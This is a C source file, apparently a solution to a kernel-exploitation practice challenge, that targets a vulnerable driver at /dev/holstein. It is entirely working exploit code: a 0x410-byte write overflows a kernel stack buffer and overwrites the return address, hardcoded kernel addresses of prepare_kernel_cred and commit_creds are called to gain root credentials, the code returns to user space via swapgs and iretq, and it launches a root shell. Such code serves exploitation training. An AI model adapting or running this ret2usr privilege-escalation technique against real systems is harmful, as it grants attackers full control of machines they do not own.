#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)

typedef unsigned long u64;

u64 dev_fd;
u64 prepare_kernel_cred = 0xffffffff8106e240;
u64 commit_creds = 0xffffffff8106e390;
u64 user_rip, user_cs, user_rflags, user_rsp, user_ss;

void win()
{
    if(getuid() == 0)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        puts("[*] enjoy");
        execve(argv[0], argv, envp);
    }
    else puts("[!] fail uid");
}

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushfq;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_rip = (u64)&win;

    puts("[*] saved state");
}

void escape_privis()
{
       __asm__(
        ".intel_syntax noprefix;"
        "mov rax, prepare_kernel_cred;"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "mov rax, commit_creds;"
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_rsp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );

}

void overflow()
{
    char payload[0x420];

    memset(payload, 'A', 0x408);
    *(u64 *)&payload[0x408] = (u64)&escape_privis;

    save_state();
    write(dev_fd, payload, 0x410);

    puts("[!] should never be reached");
}

int main()
{
    dev_fd = open("/dev/holstein", 2);
    if(dev_fd < 1) puts("[!] fail fd");

    overflow();

    puts("[!] should never be reached");
}